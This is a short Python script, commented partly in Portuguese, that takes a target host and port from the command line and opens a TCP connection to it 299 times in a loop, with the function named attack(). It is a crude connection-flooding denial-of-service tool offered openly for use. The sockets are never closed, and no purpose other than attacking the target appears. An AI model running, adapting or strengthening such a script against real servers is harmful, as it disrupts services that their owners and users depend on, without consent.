import socket, sys, os
#servidor = sys.argv[1]
#porta = sys.argv[2]


HOST = sys.argv[1]
PORT = int(sys.argv[2])
#pagina = "/"
#print("[ Attacking " + HOST  + " na porta " + PORT + " na pagina default " + pagina + "]")
def attack():
	conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	dest = (HOST,PORT)
	try:
		conn.connect(dest)
	except:
		print('failed' + HOST, 'down')
		return
	print("deu certo\n")



for i in range(1, 300):
    attack()
